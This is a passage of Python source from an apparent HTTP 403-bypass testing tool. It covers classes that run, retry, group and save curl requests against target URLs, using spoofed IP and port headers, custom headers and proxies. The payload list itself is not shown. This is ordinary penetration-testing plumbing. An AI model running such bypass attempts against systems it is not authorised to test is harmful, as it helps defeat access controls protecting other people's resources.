                # Build and output batcat command
                if len(self.clean_output) > 1:
                    inspect_cmd = f"echo {outdir}{Tools.separator}{{{','.join(filename_lst)}}} | xargs batcat"
                else:
                    inspect_cmd = f"echo {outdir}{Tools.separator}{filename_lst} | xargs batcat"

                self.logger.info(f"Also, inspect them manually with batcat:\n{inspect_cmd}")

            # Logfile - Starting at SaveLevel.MINIMAL
            if self.save_level >= self.SaveLevel.MINIMAL:
                log_file = f"{outdir}{Tools.separator}{Bypasser.default_log_filename}"
                with open(log_file, "wt") as f:
                    f.write(f"Bypass results for '{url_obj.geturl()}' url:\n")
                    f.write(f"{self.clean_output}\n")
                    if self.save_level >= self.SaveLevel.PERTINENT and inspect_cmd:
                        f.write(f"{inspect_cmd}")
                if self.verbose:
                    self.logger.info(f"Program log file which contains the results saved in {log_file}")
        else:
            if self.debug_class:
                self.logger.debug("No saving any output: SaveLevel.NONE")

    def _output_results(self, url_obj, silent_mode=False) -> defaultdict[list]:
        # Reset the list of aggregated items
        self.grouped_curl_items.clear()
        self.clean_output = ""

        # Parse all completed curl items
        for item in self.curl_items:
            # Results aggregating
            if item.response_raw_output:
                key_for_unicity = item.get_formatted_response(with_content_length=False, trunk_redirect_url=True)
                if item not in self.grouped_curl_items[key_for_unicity]:
                    self.grouped_curl_items[key_for_unicity].append(item)

        # Output program result
        if self.grouped_curl_items:
            # Get results and store (for the program log file) program output.
            with_filename = True if self.save_level >= self.SaveLevel.PERTINENT else False
            self.clean_output = \
                Bypasser.get_results_from_grouped_items(url_obj, self.grouped_curl_items, header_line=True,
                                                        with_filename=with_filename, ext_logger=self.logger,
                                                        verbose=self.verbose)
            # Print results
            if not silent_mode:
                self.logger.info(f"\n{self.clean_output}")

        return self.grouped_curl_items

    def _retry_failed_commands(self):
        """ Retry/Resend curl commands against failed items. """
        if self.to_retry_items:
            if self.retry_number > 0:
                # Save original threads number and timeout
                original_threads = self.threads
                original_timeout = self.timeout

                retry_count = 0
                while len(self.to_retry_items) > 0:
                    if retry_count >= self.retry_number:
                        break
                    # First retry rounds: threads / 2 and timeout * 2
                    if retry_count < self.retry_number - 1:
                        self.threads = int(round(self.threads / 2))
                        self.timeout = self.timeout * 2
                    # Last round 1 thread / +10s timeout
                    else:
                        self.threads = 1
                        self.timeout = self.timeout + 10
                        # Last round - adjust retry_count for logging
                        if retry_count + 1 == self.retry_number:
                            retry_count = self.retry_number - 1

                    self.logger.info(f"Retry ({retry_count + 1}/{self.retry_number}) the "
                                     f"'{len(self.to_retry_items)}' failed curl commands with '{self.threads}' "
                                     f"threads and '{self.timeout}' timeout")

                    retry_count += 1
                    self._run_curls(self.to_retry_items)

                # Restore original threads number and timeout
                self.threads = original_threads
                self.timeout = original_timeout
            # Failed request / retry_number = 0
            else:
                self.logger.warning(f"'{len(self.to_retry_items)}' curl requests failed and were lost for results. "
                                    f"Retry mode is disabled")
        # No failed requests
        else:
            self.logger.debug("Each request has reached its target. No need for retry")

    # *** Public methods *** #

    def run(self, urls=None, silent_mode=False) -> defaultdict[ParseResult, defaultdict]:
        # Target URLs can be defined in object initialization or here
        if urls:
            self.urls = urls
        if not self.urls:
            error_msg = "Can't find any valid target url."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

        # Rebuild curl base command
        self._init_curl_base(debug=self.debug_class)

        if self.debug_class:
            self.logger.debug(f"Bypasser configuration:\n{self}")

        # Prepare and run curl commands
        for url_obj in self.urls:
            # Reset previous results
            self.curl_items.clear()
            self.to_retry_items.clear()
            self.grouped_curl_items.clear()

            # Generate curl items and command
            self._generate_curls(url_obj)
            if not self.verbose and not self.debug and not self.debug_class:
                self.logger.warning(f"Trying to bypass '{url_obj.geturl()}' url ({len(self.curl_items)} payloads)...")

            # Send curl commands
            self._run_curls(self.curl_items)

            # Retry failed curl requests
            self._retry_failed_commands()

            # Show results
            results = self._output_results(url_obj, silent_mode=silent_mode)
            if url_obj not in self.bypass_results.keys():
                self.bypass_results[url_obj] = results

            # Save results (Curl request/responses and program logfile)
            self._save_results(url_obj)

        # Return global results dict for library mode
        return self.bypass_results

    @staticmethod
    def get_results_from_grouped_items(url_obj: ParseResult, grouped_curl_items: defaultdict[list], header_line=True,
                                       with_filename=True, filter_sc=None, ext_logger=None, verbose=False) -> str:
        """ Ungroup and return string from aggregated curl items.

        When the Bypasser is used as a library, this method is useful to retrieve the aggregated results in a string,
        as usually returned by the program. See the commented code in the main() function for an example of use.

        :param ParseResult url_obj: Curl command target url object
        :param defaultdict[list] grouped_curl_items: Aggregation of curls items. Result of _output_results() method
        :param bool header_line: If True return result headers: '[#####] [bypass_method] [payload] => [status_code]...'
        :param bool with_filename: If True return (item.filename) as end of output line
        :param list filter_sc: Filter status codes from results. Ex: [403,405,400]
        :param logger ext_logger: Specify your own logger for verbose output (default: None) (Optional)
        :param bool verbose: Show verbose information for this method
        :return: Aggregated results
        """
        clean_output = ""
        if grouped_curl_items:
            filter_status_codes = filter_sc if filter_sc else list()
            if ext_logger and verbose:
                ext_logger.warning(f"Triaged results & distinct pages for '{url_obj.geturl()}' url:")
            # Build output
            if header_line:
                if with_filename:
                    clean_output += f"{CurlItem.get_formatted_item_header()} (filename)\n"
                else:
                    clean_output += f"{CurlItem.get_formatted_item_header()}\n"
            for out_key, item_lst in grouped_curl_items.items():
                item_count = len(item_lst)
                if item_count == 1:
                    if item_lst[0].response_status_code not in filter_status_codes:
                        if with_filename:
                            clean_output += f"[SINGLE] {item_lst[0].get_formatted_item()} ({item_lst[0].filename})\n"
                        else:
                            clean_output += f"[SINGLE] {item_lst[0].get_formatted_item()}\n"
                else:
                    if item_lst[0].response_status_code not in filter_status_codes:
                        if with_filename:
                            clean_output += f"[GROUP ({item_count})] {item_lst[0].get_formatted_item()} " \
                                            f"({item_lst[0].filename})\n"
                        else:
                            clean_output += f"[GROUP ({item_count})] {item_lst[0].get_formatted_item()}\n"
        else:
            if ext_logger and verbose:
                ext_logger.warning(f"Failed to find any valid response for '{url_obj.geturl()}' url")

        return clean_output.rstrip("\n")

    # *** Properties ***#

    @property
    def current_bypass_modes(self) -> list[str]:
        return self._current_bypass_modes

    @current_bypass_modes.setter
    def current_bypass_modes(self, modes_lst):
        self._current_bypass_modes = list()
        self._current_bypass_modes.append(Bypasser.default_bypass_mode)
        if modes_lst:
            self._current_bypass_modes.clear()
            for mode in Tools.get_list_from_generic_arg(modes_lst, arg_name="bypass_mode", stdin_support=True, ext_logger=self.logger, debug=self.debug_class):
                if mode in Bypasser.bypass_modes:
                    if mode not in self._current_bypass_modes:
                        self._current_bypass_modes.append(mode)
                else:
                    self.logger.warning(f"Unknown bypass mode {mode} was ignored. Must be in {Bypasser.bypass_modes}")
            if "all" in self._current_bypass_modes:
                self._current_bypass_modes.clear()
                self._current_bypass_modes.append("all")
                if self.debug_class:
                    self.logger.debug("'all' was found in custom bypass mode list. Only this value will be kept")
            # If all bypass_modes was ignored
            if not self._current_bypass_modes:
                error_msg = f"Can't find any valid bypass mode. Need at least one value in {Bypasser.bypass_modes}"
                self.logger.error(error_msg)
                raise ValueError(error_msg)

    @property
    def headers(self) -> dict:
        return self._headers

    @headers.setter
    def headers(self, value):
        try:
            self._headers = dict()
            if value:
                for header in Tools.get_list_from_generic_arg(value, arg_name="header", ext_logger=self.logger,
                                                              stdin_support=False, debug=self.debug_class):
                    key, value = header.split(":", 1)
                    self._headers[key] = value.strip()
        except ValueError as e:
            if "not enough values to unpack" in str(e):
                error_msg = "Custom headers parsing error: missing ':' in one header. " \
                            "Please use 'header: value' format"
                self.logger.error(error_msg)
                raise ValueError(error_msg)
        except Exception as e:
            error_msg = f"Custom headers parsing error: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def output_dir(self) -> str:
        return self._output_dir

    @output_dir.setter
    def output_dir(self, value):
        try:
            self._output_dir = Bypasser.default_output_dir
            if value:
                # Transform if needed relative path to absolute
                self._output_dir = os.path.join(os.path.realpath(os.path.dirname(value)), os.path.basename(value))
        except Exception as e:
            error_msg = f"Custom output_dir parsing error: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def http_version(self) -> str:
        return self._http_version

    @http_version.setter
    def http_version(self, value) -> None:
        """ Set HTTP version used in curl base command.

        Reference: https://everything.curl.dev/http/versions
        CurlItem.curl_http_versions: ["0.9", "1.0", "1.1", "2", "2-prior-knowledge", "3"]

        Set to "0" to disable the HTTP version argument in curl and let it handle requests with its default version

        :param str value: HTTP version. Must be "0" or value in CurlItem.curl_http_versions
        """
        try:
            self._http_version = Bypasser.default_http_version
            if value and str(value) != "0":
                if str(value) in CurlItem.curl_http_versions:
                    self._http_version = str(value)
                else:
                    error_msg = f"Unknown HTTP version {str(value)} was ignored. Must be " \
                                f"in '{CurlItem.curl_http_versions}'"
                    self.logger.error(error_msg)
                    raise ValueError(error_msg)
        except Exception as e:
            error_msg = f"Error when setting custom http version: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def retry_number(self) -> int:
        return self._retry_number

    @retry_number.setter
    def retry_number(self, value):
        try:
            self._retry_number = int(Bypasser.default_retry_number)
            if value:
                self._retry_number = int(value)
        except Exception as e:
            error_msg = f"Invalid number of retry value: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)
        if self._retry_number < 0:
            error_msg = f"Retry number must be positive or equal to zero: '{self._retry_number}'"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def save_level(self) -> int:
        return self._save_level

    @save_level.setter
    def save_level(self, value):
        try:
            self._save_level = Bypasser.default_save_level
            if value:
                self._save_level = int(value)
        except Exception as e:
            error_msg = f"Invalid number of save_level value: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)
        if self._save_level not in [item.value for item in self.SaveLevel]:
            error_msg = f"Unknown save_level: '{self._save_level}'. Must be in the range of 0 (DISABLE) to 3 (FULL)"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def spoof_ips(self) -> list[str]:
        return self._spoof_ips

    @spoof_ips.setter
    def spoof_ips(self, value):
        try:
            self._spoof_ips = list()
            if value:
                for ip in Tools.get_list_from_generic_arg(value, arg_name="spoofip", stdin_support=True, ext_logger=self.logger, debug=self.debug_class):
                    if ip not in self._spoof_ips:
                        self._spoof_ips.append(ip)
            # Cancel the possible replace_mode that could block internal ip list in [http_headers_ip]
            if not self._spoof_ips:
                self.spoof_ip_replace = False

        except Exception as e:
            error_msg = f"Custom spoofip parsing error: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def spoof_ip_replace(self) -> bool:
        return self._spoof_ip_replace

    @spoof_ip_replace.setter
    def spoof_ip_replace(self, value):
        self._spoof_ip_replace = Bypasser.default_spoof_ip_replace
        if value:
            self._spoof_ip_replace = value

    @property
    def spoof_ports(self) -> list[int]:
        return self._spoof_ports

    @spoof_ports.setter
    def spoof_ports(self, value):
        try:
            self._spoof_ports = list()
            if value:
                for port in Tools.get_list_from_generic_arg(value, arg_name="spoofport", stdin_support=True,
                                                            ext_logger=self.logger, debug=self.debug_class):
                    if int(port) not in self._spoof_ports:
                        self._spoof_ports.append(int(port))
            # Cancel the possible replace_mode that could block internal port list in [http_headers_port]
            if not self._spoof_ports:
                self.spoof_port_replace = False
        except Exception as e:
            error_msg = f"Invalid port number value: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def spoof_port_replace(self) -> bool:
        return self._spoof_port_replace

    @spoof_port_replace.setter
    def spoof_port_replace(self, value):
        self._spoof_port_replace = Bypasser.default_spoof_port_replace
        if value:
            self._spoof_port_replace = value

    @property
    def threads(self) -> int:
        return self._thread

    @threads.setter
    def threads(self, value):
        try:
            self._thread = int(Bypasser.default_thread_number)
            if value:
                self._thread = int(value)
        except Exception as e:
            error_msg = f"Invalid number of threads value: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)
        if self._thread <= 0:
            error_msg = f"Thread number must be positive: '{self._thread}'"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def timeout(self) -> int:
        return self._timeout

    @timeout.setter
    def timeout(self, value):
        try:
            self._timeout = int(Bypasser.default_timeout)
            if value:
                self._timeout = int(value)
        except Exception as e:
            error_msg = f"Invalid timeout value: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)
        if self._timeout <= 0:
            error_msg = f"Timeout value (sec) number must be positive: '{self._timeout}'"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def urls(self) -> list[ParseResult]:
        return self._urls

    @urls.setter
    def urls(self, value):
        try:
            self._urls = list()
            if value:
                for url in Tools.get_list_from_generic_arg(value, arg_name="url", stdin_support=True,
                                                           ext_logger=self.logger, debug=self.debug_class):
                    if not Bypasser.regex_url.match(url):
                        error_msg = f"URL {url} was ignored. Must start with http:// or https:// and contain " \
                                    f"at least 3 slashes"
                        self.logger.warning(error_msg)
                    else:
                        parsed_url = urlparse(url)
                        if parsed_url not in self._urls:
                            self.urls.append(parsed_url)
        except Exception as e:
            error_msg = f"URL parsing error: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def proxy(self):
        return self._proxy

    @proxy.setter
    def proxy(self, value):
        try:
            self._proxy = None
            if value:
                if not Bypasser.regex_proxy_url.match(value):
                    error_msg = f"Proxy URL {value} was ignored. Format: 'http(s)://proxy_ip:port'"
                    self.logger.error(error_msg)
                else:
                    self._proxy = value
        except Exception as e:
            error_msg = f"Custom proxy parsing error: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def user_agent(self) -> str:
        return self._user_agent

    @user_agent.setter
    def user_agent(self, value):
        try:
            self._user_agent = Bypasser.default_user_agent
            if value:
                self._user_agent = value
        except Exception as e:
            error_msg = f"Custom user-agent parsing error: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    # *** Class identity, comparison and hashing functions *** #

    @classmethod
    def get_classname(cls):
        """ Returns the fully-qualified class name string of this object. """
        return cls.__name__

    def use_classname(self) -> str:
        return self.get_classname()

    def __attrs(self):
        return self.current_bypass_modes, self.headers, self.spoof_ips, self.threads, self.timeout, self.urls, \
               self.user_agent, self.verbose, self.debug, self.debug_class

    def __eq__(self, other) -> bool:
        """ Equality test, always use after __hash__ when object compare with ==, or if a match occurs in iterable.

        :param Bypasser other: Other object to compare with this
        :return: True is same object, else False
        """
        return isinstance(other, Bypasser) and self.__attrs() == other.__attrs()

    def __ne__(self, other) -> bool:
        """ Define a non-equality test.

        :param Bypasser other: Other object to compare with this
        :return: False is same object, else True
        """
        return not self.__eq__(other)

    def __hash__(self) -> int:
        """ Always used first in iterable object compare (set, list..) if match, call __eq__().

        :return: Object hash
        """
        return hash(self.__attrs())

    def __str__(self) -> str:
        out = str()
        out += f"Url(s): {[url_obj.geturl() for url_obj in self.urls]}\n"
        out += f"Headers(s): {self.headers}\n"
        out += f"Current bypass modes: {self.current_bypass_modes}\n"
        out += f"Threads: {self.threads}\n"
        out += f"Timeout: {self.timeout}\n"
        out += f"Retry number: {self.retry_number}\n"
        out += f"User-agent: {self.user_agent}\n"
        out += f"Proxy: {self.proxy}\n"
        out += f"Spoofip(s): {self.spoof_ips}\n"
        out += f"Spoofip replace: {self.spoof_ip_replace}\n"
        out += f"Spoofport(s): {self.spoof_ports}\n"
        out += f"Spoofport replace: {self.spoof_port_replace}\n"
        out += f"Save level: {self.save_level}\n"
        out += f"Ouput directory: {self.output_dir}\n"
        out += f"Verbose: {self.verbose}\n"
        out += f"Debug: {self.debug}\n"
        out += f"Debug_class: {self.debug_class}\n"
        out += f"Curl base: {self.base_curl}\n"
        return out


class CurlItem:
    """ Utility Class to store request and response elements related to a curl commands

        How to use this class:
          - Init object with at least Url (ParseResult) object, curl base command, final curl cmd and bypass_mode:
            item = CurlItem(url_obj, base_curl_cmd, curl_cmd, "[http_methods]")
          - Send curl command outside this class:
            response = exec_fct(item.self.request_curl_cmd)
          - Pass curl command output to response_raw_output property
            item.response_raw_output = response

        CurlItem exposes the following properties / public variables:
          - request_curl_cmd, request_curl_payload, curl_base_options, target_url, target_ip, bypass_mode
          - response_raw_output, response_headers, response_data, response_content_length, response_content_type,
            response_lines_count, response_redirect_url, response_server_type, response_status_code, response_title
    """
    curl_http_versions = ["0.9", "1.0", "1.1", "2", "2-prior-knowledge", "3"]
    regex_status_code = re.compile(r"HTTP.*\s+(\d+)\s+\w+", re.IGNORECASE)
    regex_content_length = re.compile(r"Content-Length:\s+(\d+)", re.IGNORECASE)
    regex_content_type = re.compile(r"Content-Type:\s+(\w+/\w+)", re.IGNORECASE)
    regex_http_version = re.compile(r"(?!--)http[\w\d.-]*(?<! )", re.IGNORECASE)
    regex_redirect_url = re.compile(r"Location:\s+(.*)", re.IGNORECASE)
    regex_server_type = re.compile(r"Server:\s+(.*)", re.IGNORECASE)
    regex_title = re.compile(r"<title>(.*)</title>", re.IGNORECASE)
    redirect_url_max_size = 25

    def __init__(self, target_url: ParseResult, curl_base, curl_cmd, bypass_mode=None, target_ip=None,
                 debug=False, ext_logger=None):
        """ CurlItem object init method

        :param ParseResult target_url: Curl command target url object
        :param str curl_base: Curl base command. Ex: curl -sS -kgi --path-as-is
        :param str curl_cmd: Curl full command. Ex: curl -sS -kgi --path-as-is -H 'xxx' https://target.com/path
        :param str bypass_mode:  Payload description (Optional)
        :param str target_ip: IP address of target url (Optional)
        """
        # Get a logger
        self.debug = debug
        if ext_logger:
            self.logger = ext_logger
        else:
            self.logger = Tools.get_new_logger(self.use_classname(), with_colors=True, debug_level=self.debug)

        # Request elements #
        self.target_url = target_url
        self.target_ip = target_ip
        self.bypass_mode = bypass_mode
        self.curl_base_options = curl_base
        self.request_curl_cmd = curl_cmd

        # Response elements #
        # All the following public attributes are filled automatically when the 'res_raw_output' property is set.
        self.response_raw_output = ""  # See property

    # *** Public methods *** #

    def force_http_version(self, target_http_version) -> None:
        """ Patch the current item (curl_base_options and request_curl_cmd) to force a specific http version

        :param str target_http_version: Forced http version. Ex: 1.1
        """
        # Security check
        if str(target_http_version) not in CurlItem.curl_http_versions:
            error_msg = f"Unknown HTTP version {str(target_http_version)} was ignored. Must be " \
                        f"in '{CurlItem.curl_http_versions}'"
            self.logger.error(error_msg)
            raise ValueError(error_msg)
        # Patch HTTP version
        version = f"http{str(target_http_version)}"
        if "--http" in self.curl_base_options:
            self.curl_base_options = CurlItem.regex_http_version.sub(version, self.curl_base_options)
            self.request_curl_cmd = CurlItem.regex_http_version.sub(version, self.request_curl_cmd)
        # Add HTTP version
        else:
            target_opt = f"path-as-is --{version}"
            self.curl_base_options = self.curl_base_options.replace("path-as-is", target_opt)
            self.request_curl_cmd = self.request_curl_cmd.replace("path-as-is", target_opt)

    @staticmethod
    def get_formatted_item_header(separator="=>") -> str:
        """ Return formatted curl item as string.

        Ex: [http_methods] [-X 'TRACE'] => [405] [text/html] [524] [12] [70] [405 Not Allowed] []

        :return: Formatted curl item response.
        """
        return f"[#####] [bypass_method] [payload] {separator} [status_code] [content_type] [content_length] " \
               f"[lines_count] [word_counts] [title] [server] [redirect_url]"

    def get_formatted_item(self, separator="=>") -> str:
        """ Return formatted curl item as string.

        Ex: [http_methods] [-X 'TRACE'] => [405] [text/html] [524] [12] [70] [405 Not Allowed] [nginx] []

        :return: Formatted curl item response.
        """
        return f"{self.get_formatted_payload()} {separator} " \
               f"{self.get_formatted_response(with_content_length=True)}"

    def get_formatted_payload(self) -> str:
        """ Return formatted curl item payload as string.

        :return: Formatted curl item response. Ex: [http_method] [-X 'POST']
        """
        return f"[{self.bypass_mode}] [{self.request_curl_payload}]"

    def get_formatted_response(self, with_content_length=False, trunk_redirect_url=True) -> str:
        """ Return formatted curl item response as string

        Format:
         - [Status-code] [Content-type] [Content-length] [Lines-count] [Words-count] [Title] [Server] [Redirect_url]

        Note: The two optional arguments are mainly used when aggregating responses' elements:
         - Removing the content length can be useful for response comparison. Indeed, Lines-count/Words-count
           of response data are usually more reliable
         - Limiting the size of the redirect URL can be useful to prevent it from becoming a discriminant when a
         random token is included in a long redirect URL.

        :param bool with_content_length: If False, remove content-length from response
        :param bool trunk_redirect_url: If True, truncate the size of redirection url
        :return: Formatted curl item response. Ex: [403] [text/html] [548] [13] [68] [403 Forbidden] []
        """
        # Limit the size of the redirect URL (optional)
        redirect_url = self.response_redirect_url
        if redirect_url and trunk_redirect_url:
            redirect_url = self.response_redirect_url[:CurlItem.redirect_url_max_size]

        # Use it for full response output (content_length and full redirect_url)
        if with_content_length:
            return f"[{self.response_status_code}] [{self.response_content_type}] [{self.response_content_length}] " \
                   f"[{self.response_lines_count}] [{self.response_words_count}] [{self.response_title}] " \
                   f"[{self.response_server_type}] [{self.response_redirect_url}]"
        # Use it for response aggregating (no content_length and trunked redirect_url)
        else:
            return f"[{self.response_status_code}] [{self.response_content_type}] [{self.response_lines_count}] " \
                   f"[{self.response_words_count}] [{self.response_title}] [{self.response_server_type}] " \
                   f"[{redirect_url}]"

    def save(self, output_dir, force_output_dir_creation=False) -> bool:
        out_filename = f"{output_dir}{Tools.separator}{self.filename}"
        if self.response_raw_output and Tools.is_exist_directory(output_dir, force_create=force_output_dir_creation):
            # self.logger.info(f"Saving html pages and short output in: '{output_dir}{Tools.separator}'")
            with open(f"{out_filename}", "wt") as f:
                f.write(f"{self.request_curl_cmd}\n\n{self.response_headers}\n\n{self.response_data}")
            return True
        else:
            return False

    # *** Properties *** #

    @property
    def filename(self) -> str:
        return f"bypass-{hashlib.md5(self._curl_cmd.encode()).hexdigest()}.html"

    @property
    def request_curl_payload(self) -> str:
        # import ipdb; ipdb.set_trace()
        return " ".join(self._curl_cmd[self._curl_cmd.index("--path-as-is")+1:])

    @property
    def request_curl_cmd(self) -> str:
        return self._curl_cmd

    @request_curl_cmd.setter
    def request_curl_cmd(self, value):
        try:
            self._curl_cmd = None
            if value:
                self._curl_cmd = value
        except Exception as e:
            error_msg = f"Custom curl command parsing error. {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_data(self) -> str:
        if self.response_raw_output:
            try:
                # Note: Do not use os.linesep here, all OS specific line separators have already been replaced by '\n'.
                return self.response_raw_output.split("\n\n")[1]
            except Exception as e:
                error_msg = f"Unable to return response data, please check the format and " \
                            f"redefine the 'response_raw_output' property {e}"
                self.logger.error(error_msg)
                self.logger.error(repr(self.response_raw_output))
                raise ValueError(error_msg)
        else:
            error_msg = "Please set 'response_raw_output' property before trying to access its data."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_headers(self) -> str:
        if self.response_raw_output:
            try:
                # Note: Do not use os.linesep here, all OS specific line separators have already been replaced by '\n'.
                return self.response_raw_output.split("\n\n")[0]
            except Exception as e:
                error_msg = f"Unable to return response headers, please check the format and " \
                            f"redefine the 'response_raw_output' property {e}"
                self.logger.error(error_msg)
                self.logger.error(repr(self.response_raw_output))
                raise ValueError(error_msg)
        else:
            error_msg = "Please set 'response_raw_output' property before trying to access its headers."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_status_code(self) -> int:
        if self.response_raw_output:
            try:
                return int(CurlItem.regex_status_code.search(self.response_headers).group(1))
            except Exception as e:
                error_msg = f"Unable to return response status_code, please check the format and " \
                            f"redefine the 'response_raw_output' property {e}"
                self.logger.error(error_msg)
                self.logger.error(repr(self.response_raw_output))
                raise ValueError(error_msg)
        else:
            error_msg = "Please set 'response_raw_output' property before trying to access its status_code value."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_content_length(self) -> int:
        if self.response_raw_output:
            try:
                match_content_length = CurlItem.regex_content_length.search(self.response_headers)
                return int(match_content_length.group(1).rstrip()) if match_content_length else ""
            except Exception as e:
                error_msg = f"Unable to return response content_length, please check the format and " \
                            f"redefine the 'response_raw_output' property {e}"
                self.logger.error(error_msg)
                self.logger.error(repr(self.response_raw_output))
                raise ValueError(error_msg)
        else:
            error_msg = "Please set 'response_raw_output' property before trying to access its content_length value."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_lines_count(self) -> int:
        if self.response_raw_output:
            try:
                return int(self.response_data.count("\n"))
            except Exception as e:
                error_msg = f"Unable to return response lines_count, please check the format and " \
                            f"redefine the 'response_raw_output' property {e}"
                self.logger.error(error_msg)
                self.logger.error(repr(self.response_raw_output))
                raise ValueError(error_msg)
        else:
            error_msg = "Please set 'response_raw_output' property before trying to access its lines_count value."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_words_count(self) -> int:
        if self.response_raw_output:
            try:
                return int(self.response_data.count(" "))
            except Exception as e:
                error_msg = f"Unable to return response words_count, please check the format and " \
                            f"redefine the 'response_raw_output' property {e}"
                self.logger.error(error_msg)
                self.logger.error(repr(self.response_raw_output))
                raise ValueError(error_msg)
        else:
            error_msg = "Please set 'response_raw_output' property before trying to access its words_count value."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_content_type(self) -> str:
        if self.response_raw_output:
            try:
                match_content_type = CurlItem.regex_content_type.search(self.response_headers)
                return match_content_type.group(1).rstrip() if match_content_type else ""
            except Exception as e:
                error_msg = f"Unable to return response content_type, please check the format and " \
                            f"redefine the 'response_raw_output' property {e}"
                self.logger.error(error_msg)
                self.logger.error(repr(self.response_raw_output))
                raise ValueError(error_msg)
        else:
            error_msg = "Please set 'response_raw_output' property before trying to access its content_type value."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_redirect_url(self) -> str:
        if self.response_raw_output:
            try:
                match_redirect_url = CurlItem.regex_redirect_url.search(self.response_headers)
                return match_redirect_url.group(1).rstrip() if match_redirect_url else ""
            except Exception as e:
                error_msg = f"Unable to return response redirect_url, please check the format and " \
                            f"redefine the 'response_raw_output' property {e}"
                self.logger.error(error_msg)
                self.logger.error(repr(self.response_raw_output))
                raise ValueError(error_msg)
        else:
            error_msg = "Please set 'response_raw_output' property before trying to access its redirect_url value."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_server_type(self) -> str:
        if self.response_raw_output:
            try:
                match_server_type = CurlItem.regex_server_type.search(self.response_headers)
                return match_server_type.group(1).rstrip() if match_server_type else ""
            except Exception as e:
                error_msg = f"Unable to return response server_type, please check the format and " \
                            f"redefine the 'response_raw_output' property {e}"
                self.logger.error(error_msg)
                raise ValueError(error_msg)
        else:
            error_msg = "Please set 'response_raw_output' property before trying to access its server_type value."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_title(self) -> str:
        if self.response_raw_output:
            try:
                match_title = CurlItem.regex_title.search(self.response_data)
                return match_title.group(1) if match_title else ""
            except Exception as e:
                error_msg = f"Unable to return response title, please check the format and " \
                            f"redefine the 'response_raw_output' property {e}"
                self.logger.error(error_msg)
                raise ValueError(error_msg)
        else:
            error_msg = "Please set 'response_raw_output' property before trying to access its title value."
            self.logger.error(error_msg)
            raise ValueError(error_msg)

    @property
    def response_raw_output(self) -> str:
        return self._response_raw_output

    @response_raw_output.setter
    def response_raw_output(self, value):
        self._response_raw_output = ""
        try:
            if value:
                # Can occur under Linux when a curl response is received from a Windows server.
                if '\r' in value:
                    self.response_raw_output = value.replace("\r\n", "\n")  # Windows server responses
                    self.response_raw_output = self.response_raw_output.replace("\r", "\n")  # Mac OS <= 9, useless ?
                else:
                    self._response_raw_output = value
        except Exception as e:
            error_msg = f"Custom curl raw output parsing error. {e}"
            self.logger.error(error_msg)
            self.logger.error(repr(value))
            raise ValueError(error_msg)

    # *** Class identity, comparison and hashing functions *** #

    @classmethod
    def get_classname(cls) -> str:
        """ Returns the fully-qualified class name string of this object. """
        return cls.__name__

    def use_classname(self) -> str:
        return self.get_classname()

    def __attrs(self):
        return self.target_url, self.target_ip, self.bypass_mode, self.curl_base_options, self.request_curl_cmd, \
               self.response_raw_output

    def __eq__(self, other) -> bool:
        """ Equality test, always use after __hash__ when object compare with ==, or if a match occurs in iterable.

        :param CurlItem other: Other object to compare with this
        :return: True is same object, else False
        """
        return isinstance(other, CurlItem) and self.__attrs() == other.__attrs()

    def __ne__(self, other) -> bool:
        """ Define a non-equality test.

        :param CurlItem other: Other object to compare with this
        :return: False is same object, else True
        """
        return not self.__eq__(other)

    def __hash__(self) -> int:
        """ Always used first in iterable object compare (set, list..) if match, call __eq__().

        :return: Object hash
        """
        return hash(self.__attrs())

    def __str__(self) -> str:
        out = str()
        out += f"Target url: {self.target_url.geturl()}\n"
        out += f"Target ip: {self.target_ip}\n"
        out += f"Bypass mode: {self.bypass_mode}\n"
        out += f"Curl command: {self.request_curl_cmd}\n"
        out += f"Curl base: {self.curl_base_options}\n"
        out += f"Curl payload: {self.request_curl_payload}\n"
        if self.response_raw_output:
            out += f"Formatted response: " \
                   f"{self.get_formatted_response(with_content_length=True, trunk_redirect_url=False)}\n"
        return out


class Tools:
    """ Utility class for this project. """

    # Useful cross-platform properties
    is_windows = platform.system() == "Windows"
    is_linux = platform.system() == "Linux"
    separator = '\\' if is_windows else "/"

    @staticmethod
    def replacenth(string, sub, wanted, n) -> str:
        """ Based on https://stackoverflow.com/a/35091558 """
        where = [m.start() for m in re.finditer(sub, string)][n - 1]
        return string[:where] + string[where:].replace(sub, wanted, 1)

    @staticmethod
    def get_new_logger(logger_name, with_colors=False, debug_level=False) -> logger:
        """ Create and return new logger.

        :param str logger_name: Logger name
        :param with_colors: If True apply logger coloration with coloredlogs lib
        :param debug_level: If True, set level=logging.DEBUG else logging.INFO
        :return: Created logger object
        """
        new_logger = logging.getLogger(logger_name)
        if with_colors:
            coloredlogs.install(logger=new_logger, level=logging.DEBUG if debug_level else logging.INFO)
        else:
            new_logger.setLevel(logging.DEBUG if debug_level else logging.INFO)
            formatter = logging.Formatter('%(name)s %(levelname)s > %(message)s')
